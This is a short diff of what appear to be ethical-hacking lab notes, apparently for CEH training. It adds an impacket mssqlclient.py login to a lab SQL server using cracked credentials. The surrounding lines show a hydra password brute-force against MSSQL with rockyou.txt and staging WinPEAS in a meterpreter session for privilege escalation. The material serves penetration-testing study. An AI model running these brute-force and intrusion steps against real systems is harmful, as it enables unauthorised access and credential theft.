@@ -1078,6 +1078,7 @@ hydra -L user.txt -P /root/ADtools/rockyou.txt 10.10.1.30 mssql
 >>
 Next, we will attempt to log into the service using mssqlclient.py.
 the data base name is master here
+ python3 /root/impacket/examples/mssqlclient.py CEH.com/SQL_srv:batman@10.10.1.30 -port 1433.
 ```
 ```console
 ~$: and execute
@@ -1104,7 +1105,7 @@ whoami (to confirm the username)
 ~$: to perform a higher attack we need a higher previlage so
 we are going to run WinPEASx64.exe in victim machine
 in meterpreter
-Move to C:\ using the command cd C:\.cd \Users\Public\Downloads
+Move to C:\ using the command cd C:\ cd \Users\Public\Downloads
 type powershell
 
 >> we need to host winPEASx64.exe 
